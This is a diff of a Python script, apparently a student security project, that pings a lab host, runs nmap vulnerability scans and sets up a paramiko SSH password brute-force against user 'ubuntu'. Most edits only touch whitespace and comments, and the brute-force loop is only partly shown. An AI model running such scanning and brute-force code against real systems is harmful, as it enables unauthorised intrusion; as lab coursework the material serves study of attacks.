@@ -20,7 +20,7 @@ import socket
 import threading, time
 from termcolor import colored
 
-#-------------------------------------------------FPing + NSE-port-scan--------------------------------------------------------#
+#-------------------------------------------------Fping + NSE-port-scan--------------------------------------------------------#
 
 #Execution of the ping using the system ping the host (victims) (15 ping only) && Executing Nmap script to scan for Open ports from the host
 os.system('ping 192.168.253.136 -c 15 & nmap -sV 192.168.253.136')
@@ -32,18 +32,15 @@ print("pfing and NSE port scan Done!")
 #Installing the vulscan script from git clone https://github.com/mrxdragan95/CTEC3451_2021_520_Development-Project.git
 def vulscan():
     os.system('ln -s `pwd`/vulscan /usr/share/nmap/scripts/vulscan')
-    print("Moving_to_Script-Vulscan.nse")
-
-    
+    print("Moving_to_Script-Vulscan.nse")    
 vulscan()
-#Executing Nmap vulnerability scan using NSE scripts from the host  
+ 
 
-exit_tag = 0
-#setting the initial value to 0
-
-print("\n\nstarting...")
-#Executing Nmap vulnerability scan using NSE scripts from the host  
+#Executing Nmap vulnerability scan using NSE scripts from the host 
 os.system('nmap --script vuln  192.168.253.136 &')
+time.sleep(1)
+#setting the initial value to 0
+print("\n\nstarting...")  
 os.system("notify-send Successfully initiated'")
 time.sleep(2)
 
@@ -52,11 +49,13 @@ username = "ubuntu"
 password_file = "passwords.txt"
 #Grasping the required variables....
 
+
 #Setting A SSH join Function to start SSH period Against Target...
 def ssh_connect(password, code=0):
   global exit_tag
   ssh = paramiko.SSHClient()
   ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+  
 
 #read-through for each accurate password in List 
   try:
@@ -95,4 +94,3 @@ with open(password_file, 'r') as file:
 print("Brute-Force-SHH_and_NSE_Vulnerability_Completed")
 
 print("Completed")
- 
